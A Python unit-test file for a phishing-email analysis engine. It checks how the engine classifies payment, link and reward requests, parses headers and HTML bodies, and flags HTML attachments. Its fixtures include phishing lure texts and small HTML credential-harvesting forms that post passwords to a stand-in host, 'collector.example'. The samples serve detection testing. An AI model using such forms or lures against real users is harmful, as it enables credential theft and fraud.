"""Behavioural regressions from the phishing corpus, with legitimate controls."""
import tempfile
import unittest
from email.message import EmailMessage
from pathlib import Path
from unittest.mock import patch

from fishstop_engine.analyzer.soc_analyzer import EmlSOCAnalyzer
from fishstop_engine.analyzer.attachment import analyze_attachment
from fishstop_engine.analyzer.conversation import inspect_conversation_bytes
from fishstop_engine.analyzer import llm_context_analyzer as llm
from fishstop_engine.domain_utils import identity_mailbox, mailbox_candidates


def assess(body, links=None, **model):
    report = {"body_for_intent": body, "links": links or [], "attachments": []}
    raw = {"action": "info", "channel": "none", "evidence": "", "signals": [],
           "summary": "An informational update.", "risk_assessment": "benign", **model}
    return llm.apply_email_risk_policy(report, raw)


def web(label, url="https://unknown.example/action"):
    return {"url": url, "host": "unknown.example", "scheme": "https", "display_text": label,
            "html_call_to_action": True, "role": "body_action", "actionable": True}


class AuditActionTests(unittest.TestCase):
    def test_supplied_settings_link_is_not_independent(self):
        result = assess("Your storage is full. Settings > Storage", [web("Settings > Storage")],
                        action="change_settings", channel="known_procedure", evidence="Settings > Storage",
                        summary="Use its independently supported portal.")
        self.assertEqual("supplied_link", result["action_channel"])
        self.assertNotEqual("legitimate", result["final_verdict"])
        self.assertNotIn("independently", result["content_summary"])

    def test_independently_opened_settings_without_link_remain_legitimate(self):
        result = assess("Open your previously installed app independently and go to Settings > Storage.",
                        action="change_settings", channel="known_procedure", evidence="Settings > Storage")
        self.assertEqual("normal_known_procedure", result["action_channel"])
        self.assertEqual("legitimate", result["final_verdict"])

    def test_download_and_install_request_is_preserved(self):
        result = assess("Download the desktop app: https://unknown.example/action. Install it and connect your wallet.", [web("Download the desktop app")])
        self.assertEqual("visit_link", result["requested_action"])
        self.assertEqual("supplied_link", result["action_channel"])
        self.assertNotEqual("legitimate", result["final_verdict"])

    def test_download_warning_is_not_a_request(self):
        result = assess("Never download the desktop app from an unsolicited email.",
                        [{**web("Company"), "html_call_to_action": False, "role": "signature"}])
        self.assertEqual("informational", result["requested_action"])

    def test_explicit_wire_and_customs_payment_survive_grounding(self):
        for body in ("Please make the wire transfer\ntoday.", "A customs duty and tax payment is required.", "Please pay the attached invoice."):
            with self.subTest(body=body):
                result = assess(body, action="payment", evidence=body.replace("\n", " "))
                self.assertEqual("pay_or_transfer", result["requested_action"])
                self.assertTrue(result["semantic_extraction"]["asks_for_payment"])

    def test_promised_credit_and_payment_warning_do_not_request_payment(self):
        for body in ("I will transfer this money into your bank account.",
                     "The money will be transferred to you, 30% for you and 60% for me.",
                     "Do not pay the invoice or transfer money to this account."):
            with self.subTest(body=body):
                result = assess(body, action="payment", evidence=body)
                self.assertFalse(result["semantic_extraction"]["asks_for_payment"])
                self.assertNotEqual("pay_or_transfer", result["requested_action"])

    def test_mailto_is_reply_not_web(self):
        result = assess("Verify Account", [{**web("Verify Account", "mailto:support@example.com"), "scheme": "mailto"}],
                        action="verify", channel="link", evidence="Verify Account")
        self.assertEqual("email_reply", result["action_channel"])
        self.assertFalse(result["semantic_extraction"]["asks_to_click_link"])

    def test_reward_in_german_is_consistent(self):
        result = assess("Nehmen Sie an unserem offiziellen Gewinnspiel teil. Jetzt teilnehmen", [web("Jetzt teilnehmen")])
        self.assertEqual("claim_reward", result["requested_action"])
        self.assertTrue(result["semantic_extraction"]["asks_to_claim_reward"])

    def test_reward_model_claim_with_missing_quote_recovers_actual_cta(self):
        result = assess("Offizielles Gewinnspiel. " + "Legal footer "*40 + "Jetzt teilnehmen",
                        [web("Jetzt teilnehmen")], action="claim_reward", channel="link", evidence="invented prize quotation")
        self.assertEqual("claim_reward", result["requested_action"])
        self.assertEqual("Jetzt teilnehmen", result["intent_evidence"])

    def test_course_price_is_not_a_reward(self):
        result = assess("Der Preis für den Kurs beträgt 50 EUR. Jetzt teilnehmen", [web("Jetzt teilnehmen")])
        self.assertNotEqual("claim_reward", result["requested_action"])

    def test_link_to_pay_customs_preserves_payment_outcome(self):
        result = assess("A customs duty and tax payment is required. Please complete the payment.",
                        [web("Pay Customs Duty")], action="visit_link", channel="link", evidence="Pay Customs Duty")
        self.assertEqual("pay_or_transfer", result["requested_action"])
        self.assertEqual("supplied_link", result["action_channel"])

    def test_document_cta_recovers_other(self):
        result = assess("View Document", [web("View Document")], action="other", evidence="View Document")
        self.assertEqual("visit_link", result["requested_action"])

    def test_downgraded_action_has_no_stale_reward_boolean(self):
        result = assess("Your quarterly statement is ready.", action="claim_reward", evidence="invented claim",
                        asks_to_claim_reward=True)
        self.assertEqual("informational", result["requested_action"])
        self.assertFalse(result["semantic_extraction"]["asks_to_claim_reward"])

    def test_brand_decoration_preserves_legitimate_scripts(self):
        self.assertEqual("Apple ID", llm._normalize_obfuscated_text("Ap\u073fpl\u073fe ID"))
        for text in ("Café", "שָׁלוֹם", "ܐܰ"):
            self.assertEqual(text, llm._normalize_obfuscated_text(text))

    def test_obfuscated_brand_id_heading_is_grounded_as_sender_claim(self):
        with patch("fishstop_engine.identity_store.known_identity_names", return_value=["Apple"]):
            brand, role = llm._visible_identity_fallback({"from_": "Ap\u073fpl\u073fe ID <sender@example.com>", "body_clean": "normal"})
        self.assertEqual("Apple", brand)
        self.assertEqual("representative", role)


class AuditParserTests(unittest.TestCase):
    def parse(self, msg):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory)/"test.eml";path.write_bytes(msg.as_bytes())
            return EmlSOCAnalyzer().analyze(str(path))

    def test_divergent_html_is_kept_for_ai(self):
        msg=EmailMessage();msg["From"]="sender@example.com";msg.set_content("This body")
        msg.add_alternative("<p>Your mailbox is full. Unless you update your account storage today you will lose access to all incoming messages.</p><a href='https://unknown.example'>Take action</a>",subtype="html")
        report=self.parse(msg)
        self.assertTrue(report["body_alternatives_divergent"])
        self.assertIn("mailbox is full",report["body_for_intent"])

    def test_over_budget_body_returns_bounded_partial_report(self):
        msg=EmailMessage();msg["From"]="sender@example.com";msg.set_content("Please verify your account. " + "x"*250000)
        with patch("fishstop_engine.analyzer.soc_analyzer.MAX_DECODED_TEXT_CHARS", 1000), patch("fishstop_engine.analyzer.soc_analyzer.MAX_AI_BODY_CHARS", 500):
            report=self.parse(msg)
        self.assertTrue(report["body_analysis_incomplete"])
        self.assertLessEqual(len(report["body_for_ai"]),500)
        self.assertTrue(any(f["field"]=="Analysis coverage" for f in report["flags"]))

    def test_multiple_from_candidates_remain_ambiguous(self):
        raw='"delivery@FedEx.es", info@reply.es.shop-canda.com'
        self.assertEqual(("", ""),identity_mailbox(raw))
        self.assertEqual(2,len(mailbox_candidates(raw)))
        msg=EmailMessage();msg["From"]=raw;msg.set_content("An update.")
        report=self.parse(msg)
        self.assertTrue(report["from_ambiguous"])
        self.assertIsNone(EmlSOCAnalyzer._extract_address(raw))

    def test_cc_does_not_terminate_forwarded_headers(self):
        raw=b"From: sender@example.com\nSubject: Outer\n\n----- Forwarded message -----\nFrom: Purchases <p@example.net>\nTo: b@example.com\nCc: c@example.com\nSubject: Proforma Invoice\n\nPlease pay the invoice."
        segment=inspect_conversation_bytes(raw)["segments"][1]
        self.assertEqual("Proforma Invoice",segment["subject"])
        self.assertEqual("c@example.com",segment["cc"])
        self.assertNotIn("Subject:",segment["text"])

    def test_html_attachment_exposes_credential_form_and_destination(self):
        payload=b"<html><form action='https://collector.example/submit'><input type='password'></form><script>/*never executed*/</script></html>"
        report=analyze_attachment("invoice.htm","text/html","8bit",payload,from_domain="company.example")
        self.assertTrue(report["extension_match"])
        self.assertEqual("high",report["html_security"]["risk_level"])
        self.assertIn("https://collector.example/submit",report["embedded_urls"])
        self.assertTrue(report["inspection"]["content_inspected"])

    def test_utf16_html_credentials_are_inspected(self):
        payload="<html><form action='https://collector.example'><input type='password'></form></html>".encode("utf-16")
        report=analyze_attachment("invoice.htm","text/html","base64",payload,from_domain="company.example")
        self.assertEqual("high",report["html_security"]["risk_level"])
        self.assertEqual(1,report["html_security"]["credential_field_count"])

    def test_orphan_password_is_detected_without_claiming_its_destination(self):
        payload=b"<html><form action='https://collector.example'></form><input type='password' name='passwd'></html>"
        report=analyze_attachment("invoice.htm","text/html","8bit",payload,from_domain="company.example")
        html=report["html_security"]
        self.assertEqual(1,html["unassociated_sensitive_field_count"])
        self.assertEqual("",html["credential_fields"][0]["form_action"])
        self.assertEqual("medium",html["risk_level"])

    def test_html_disguised_as_spreadsheet_is_separate_from_mime_alias(self):
        report=analyze_attachment("purchase.xls.htm","text/html","8bit",b"<html><p>Document</p></html>")
        self.assertTrue(report["extension_match"])
        self.assertEqual("medium",report["attachment_security"]["risk_level"])
        self.assertIn("html_document_disguise",[f["key"] for f in report["attachment_security"]["findings"]])

    def test_legitimate_htm_has_no_mismatch_or_credential_alarm(self):
        report=analyze_attachment("summary.htm","text/html","8bit",b"<html><p>Monthly sales summary.</p></html>")
        self.assertTrue(report["extension_match"])
        self.assertEqual("clean",report["attachment_security"]["risk_level"])

    def test_type_only_never_claims_content_inspected(self):
        report=analyze_attachment("config.mobileconfig","application/octet-stream","8bit",b"configuration")
        self.assertEqual("type_only",report["inspection"]["status"])
        self.assertFalse(report["inspection"]["analysis_complete"])
        self.assertFalse(report["inspection"]["content_inspected"])


if __name__=="__main__":unittest.main()
